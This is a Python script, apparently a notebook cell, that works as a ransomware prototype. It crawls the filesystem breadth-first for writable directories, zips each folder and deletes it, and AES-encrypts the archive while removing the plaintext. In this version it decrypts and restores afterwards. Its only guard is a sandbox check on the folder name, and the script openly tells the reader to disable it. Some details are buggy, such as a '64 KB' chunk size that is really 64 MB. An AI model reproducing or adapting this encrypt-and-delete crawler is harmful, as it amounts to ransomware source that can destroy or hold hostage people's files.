#@title Complete folder/file manipulation
# sudo apt-get update
# sudo apt-get install -y python3-pip
# !pip install -y cryptography
from pathlib import Path
from collections import deque
import os, time, shutil, zipfile, platform
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("app.log"),
        logging.StreamHandler()
    ]
)

# AES key and IV
key = os.urandom(32)  # Generate a random 256-bit key
iv = os.urandom(16)   # Generate a random 128-bit IV

# main_folder = os.path.join('sample_data')
zip_folder_name = os.path.join('zip_data.zip')
output_file = os.path.join('encrypted_data.bin')


# Function to grant permission (no-op for Windows)
def grant_permission(path, permission=0o700):
    if platform.system() != 'Windows':  # Only set permissions on Linux/macOS
        try:
            os.chmod(path, permission)
            logging.info(f"Permissions {oct(permission)} granted to {path}")
        except Exception as e:
            logging.error(f"Error setting permissions for {path}: {e}")


# Zip folder function
def zip_folder(folder_path, output_zip):
    try:
        with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(folder_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    zipf.write(file_path, os.path.relpath(file_path, folder_path))
        shutil.rmtree(folder_path)  # Delete the folder after zipping
        logging.info(f"Deleted folder '{folder_path}' after zipping.")
    except Exception as e:
        logging.error(f"Error zipping folder: {e}")


# Unzip folder function
def unzip_folder(zip_path, output_folder):
    try:
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(output_folder)
        os.remove(zip_path)
    except Exception as e:
        logging.error(f"Error unzipping folder: {e}")


# File encryption function
def encrypt_file(key, iv, input_file, output_file):
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    try:
        chunk_size = 64 * 1024 * 1024  # 64 KB
        with open(input_file, 'rb') as f_in, open(output_file, 'wb') as f_out:
            while chunk := f_in.read(chunk_size):
                if len(chunk) % 16 != 0:
                    padding_length = 16 - len(chunk) % 16
                    chunk += bytes([padding_length]) * padding_length
                f_out.write(encryptor.update(chunk))
            f_out.write(encryptor.finalize())
        os.remove(input_file)  # Delete the original zip file after encryption
        logging.info(f"Deleted '{input_file}' after encryption.")
    except Exception as e:
        logging.error(f"Error encrypting file: {e}")


# File decryption function
def decrypt_file(key, iv, input_file, output_file):
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    try:
        with open(input_file, 'rb') as f_in, open(output_file, 'wb') as f_out:
            encrypted_data = f_in.read()
            decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
            padding_length = decrypted_data[-1]
            decrypted_data = decrypted_data[:-padding_length]
            f_out.write(decrypted_data)
        os.remove(input_file)  # Delete the encrypted file after decryption
        logging.info(f"Deleted '{input_file}' after decryption.")
    except Exception as e:
        logging.error(f"Error decrypting file: {e}")





# Check if the directory is accessible and writable
def is_accessible_and_writable(directory):
    return os.access(str(directory), os.R_OK) and os.access(str(directory), os.W_OK)

# List directories with read-write permission using BFS
def pf(starting_dir, limit_dir):
    accessible_writable_dirs = []
    queue = deque([starting_dir.resolve()])  # Initialize BFS queue with the starting directory
    visited = set()  # Keep track of visited directories

    # Perform BFS traversal
    while queue:
        current_dir = queue.popleft()

        # Check the directory if it's not visited
        if current_dir not in visited:
            visited.add(current_dir)

            # If the directory is accessible and writable, add to the result list
            if is_accessible_and_writable(current_dir):
                accessible_writable_dirs.append(current_dir)

            # Add subdirectories to the queue for further exploration
            for entry in current_dir.iterdir():
                if entry.is_dir() and entry.resolve() not in visited:
                    queue.append(entry.resolve())

        # Stop BFS when the limit directory is reached
        if current_dir == limit_dir.parent.resolve():
            break

        # Explore the parent directory to move towards the root or limit
        if current_dir != current_dir.root:
            parent_dir = current_dir.parent.resolve()
            if parent_dir not in visited:
                queue.append(parent_dir)

    # Remove directories from CWD's parent to the limit directory
    remove_parent_dirs_to_limit(accessible_writable_dirs, starting_dir, limit_dir)

    return accessible_writable_dirs

# Remove directories from the current working directory's parent up to the limit
def remove_parent_dirs_to_limit(accessible_dirs, starting_dir, limit_dir):
    current = starting_dir
    limit_resolved = limit_dir.resolve()
    limit_parent = limit_dir.parent.resolve()

    # Remove directories from the list that are in the path from CWD to limit_dir
    while current != limit_resolved and current != current.root:
        if current in accessible_dirs:
            accessible_dirs.remove(current)
        current = current.parent

    # Remove the limit directory and root directory explicitly
    if limit_resolved in accessible_dirs:
        accessible_dirs.remove(limit_resolved)
    if limit_parent in accessible_dirs:
        accessible_dirs.remove(limit_parent)

    # Remove the root directory if included in the list
    root_dir = limit_resolved.root
    if Path(root_dir) in accessible_dirs:
        accessible_dirs.remove(Path(root_dir))

# Safety check to ensure the program runs only in a sandboxed environment
def safety(accessible_dirs):
    cwd = Path.cwd()
    current = cwd.name
    sandbox = 'subdir'

    # Disable actions if not in the sandbox directory
    if current != sandbox:
        accessible_dirs = []
        print("\nYou're not in a sandbox. Don't play with fire.\nOr Ignore it & just disable the safety.")
    return accessible_dirs

# Define starting directory and limit directory
starting_directory = Path('.').resolve()
limit_directory = Path(r'C:\Users\JOHN\Desktop\PRK\rhost_app\sample_data')  # Adjust the path as necessary

# Get the list of accessible and writable directories
# accessible_writable_dirs = pf(starting_directory, limit_directory)
accessible_writable_dirs = safety(pf(starting_directory, limit_directory))


# Print the results
print("\nAccessible and Writable Directories After Removal:\n")
for directory in accessible_writable_dirs:
    print(directory)


for main_folder in accessible_writable_dirs:
    if not os.path.exists(main_folder):
        logging.error(f"Folder '{main_folder}' not found.")

    else:
        grant_permission(main_folder)
        time.sleep(2)
        # Zip the folder
        zip_folder(main_folder, zip_folder_name)
        logging.info(f"Zipped folder '{main_folder}' to '{zip_folder_name}'")
        time.sleep(3)

        # Encrypt and save the zipped file
        encrypt_file(key, iv, zip_folder_name, output_file)
        logging.info("File encrypted and saved.")
        logging.info(f"Key: {key}\nIV: {iv}")
        time.sleep(3)

        # Decrypt the file
        decrypt_file(key, iv, output_file, zip_folder_name)
        logging.info("File decrypted and saved.")
        time.sleep(4)

        # Unzip the decrypted file
        unzip_folder(zip_folder_name, main_folder)
        logging.info(f"Unzipped '{zip_folder_name}' to '{main_folder}'")

        # Grant permission to the unzipped folder
        grant_permission(main_folder)
